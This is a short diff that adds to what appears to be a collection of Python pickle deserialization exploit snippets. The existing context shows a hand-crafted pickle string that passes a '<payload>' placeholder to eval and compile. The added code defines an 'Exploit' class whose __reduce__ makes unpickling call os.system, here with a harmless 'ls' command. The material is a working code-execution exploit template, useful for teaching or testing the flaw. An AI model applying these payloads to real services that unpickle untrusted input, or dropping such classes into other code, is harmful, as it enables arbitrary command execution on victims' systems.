@@ -15,3 +15,19 @@ pstr="c__builtin__\neval\n(c__builtin__\ncompile\n(%sS'<payload>'\nS'exec'\ntRtR
 pickle.loads(pstr)
 
 
+
+
+#python2 python3
+
+import os
+import pickle
+# Exploit that we want the target to unpickle
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('ls',))
+
+
+shellcode = pickle.dumps(Exploit())
+pickle.loads(shellcode)
+
+
